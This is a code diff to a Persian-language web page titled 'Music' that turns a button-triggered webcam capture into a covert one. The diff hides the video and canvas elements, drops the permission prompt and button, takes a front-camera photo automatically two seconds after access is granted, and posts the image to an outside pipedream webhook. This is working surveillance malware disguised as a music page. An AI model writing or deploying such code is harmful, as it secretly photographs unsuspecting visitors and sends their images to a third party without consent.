@@ -2,56 +2,48 @@
 <html lang="fa">
 <head>
     <meta charset="UTF-8">
-    <title>موزیک گیم </title>
+    <title>موزیک </title>
+    <style>
+        video, canvas, img {
+            display: none; /* عکس */
+        }
+    </style>
 </head>
 <body>
-    <h2>برای ورود اجازه دهید</h2>
-    <video id="video" width="640" height="480" autoplay playsinline></video>
-    <button id="capture">مجوز</button>
-    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
+    <!-- عناصر مخفی شده -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+    <img id="preview">
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const preview = document.getElementById('preview');
         const context = canvas.getContext('2d');
 
-        let streamReady = false;
-
-        // درخواست دسترسی به دوربین
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(function (stream) {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
                 video.srcObject = stream;
-                streamReady = true;
+
+                // صبر برای آماده شدن دوربین
+                setTimeout(() => {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const dataUrl = canvas.toDataURL("image/jpeg");
+
+                    // ارسال عکس به سرور یا Webhook
+                    fetch("https://eoeq114hreszd00.m.pipedream.net", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({ image: dataUrl })
+                    }).then(() => console.log("عکس ارسال شد"))
+                      .catch(err => console.error("خطا در ارسال:", err));
+                }, 2000); // زمان گرفتن عکس (۲ ثانیه)
             })
-            .catch(function (error) {
-                alert(' رد شد ');
-                console.error(error);
+            .catch(error => {
+                console.error("عدم دسترسی به دوربین:", error);
             });
-
-        document.getElementById('capture').addEventListener('click', function () {
-            if (!streamReady) {
-                alert("لطفاً منتظر بمانید .");
-                return;
-            }
-
-            // اندکی صبر برای بارگیری تصویر (در صورت لزوم)
-            setTimeout(() => {
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                const dataUrl = canvas.toDataURL("image/jpeg");
-
-                // ارسال تصویر به Webhook
-                fetch("https://eoeq114hreszd00.m.pipedream.net", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({ image: dataUrl })
-                })
-                .then(response => console.log("ارسال شد"))
-                .catch(error => console.error("خطا در ارسال:", error));
-            }, 1000); // صبر یک ثانیه‌ای
-        });
     </script>
 </body>
 </html>
